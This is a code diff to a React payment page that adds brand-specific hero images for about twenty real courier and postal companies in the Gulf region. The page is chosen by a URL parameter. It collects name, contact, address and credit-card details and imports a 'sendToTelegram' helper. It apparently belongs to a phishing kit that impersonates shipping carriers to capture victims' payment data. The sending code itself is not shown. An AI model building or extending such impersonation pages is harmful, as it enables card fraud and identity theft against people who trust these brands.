@@ -14,6 +14,28 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import heroAramex from "@/assets/hero-aramex.jpg";
+import heroDhl from "@/assets/hero-dhl.jpg";
+import heroFedex from "@/assets/hero-fedex.jpg";
+import heroSmsa from "@/assets/hero-smsa.jpg";
+import heroUps from "@/assets/hero-ups.jpg";
+import heroEmpost from "@/assets/hero-empost.jpg";
+import heroZajil from "@/assets/hero-zajil.jpg";
+import heroNaqel from "@/assets/hero-naqel.jpg";
+import heroSaudipost from "@/assets/hero-saudipost.jpg";
+import heroKwpost from "@/assets/hero-kwpost.jpg";
+import heroQpost from "@/assets/hero-qpost.jpg";
+import heroOmanpost from "@/assets/hero-omanpost.jpg";
+import heroBahpost from "@/assets/hero-bahpost.jpg";
+import heroGenacom from "@/assets/hero-genacom.jpg";
+import heroAlbaraka from "@/assets/hero-albaraka.jpg";
+import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
+import heroAlshaya from "@/assets/hero-alshaya.jpg";
+import heroBahri from "@/assets/hero-bahri.jpg";
+import heroShipco from "@/assets/hero-shipco.jpg";
+import heroHellmann from "@/assets/hero-hellmann.jpg";
+import heroDsv from "@/assets/hero-dsv.jpg";
+import heroBg from "@/assets/hero-bg.jpg";
 
 const PaymentRecipient = () => {
   const { id } = useParams();
@@ -69,8 +91,38 @@ const PaymentRecipient = () => {
     logo: branding.logo
   };
 
-  // Use hero image from branding with fallback
-  const heroImage = branding.heroImage || "/assets/hero-bg.jpg";
+  // Use hero image mapping like DynamicPaymentLayout
+  const heroImages: Record<string, string> = {
+    'aramex': heroAramex,
+    'dhl': heroDhl,
+    'dhlkw': heroDhl,
+    'dhlqa': heroDhl,
+    'dhlom': heroDhl,
+    'dhlbh': heroDhl,
+    'fedex': heroFedex,
+    'smsa': heroSmsa,
+    'ups': heroUps,
+    'empost': heroEmpost,
+    'zajil': heroZajil,
+    'naqel': heroNaqel,
+    'saudipost': heroSaudipost,
+    'kwpost': heroKwpost,
+    'qpost': heroQpost,
+    'omanpost': heroOmanpost,
+    'bahpost': heroBahpost,
+    'genacom': heroGenacom,
+    'jinaken': heroGenacom,
+    'albaraka': heroAlbaraka,
+    'alfuttaim': heroAlfuttaim,
+    'alshaya': heroAlshaya,
+    'bahri': heroBahri,
+    'national': heroBahri,
+    'shipco': heroShipco,
+    'hellmann': heroHellmann,
+    'dsv': heroDsv,
+  };
+  
+  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
 
   // Use dynamic company meta for OG tags
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
@@ -175,7 +227,9 @@ const PaymentRecipient = () => {
       // Silent error handling
     }
 
-    navigate(`/pay/${id}/details`);
+    // Preserve query parameters for service key and currency
+    const queryString = new URLSearchParams(window.location.search).toString();
+    navigate(`/pay/${id}/details${queryString ? `?${queryString}` : ''}`);
   };
   
   return (
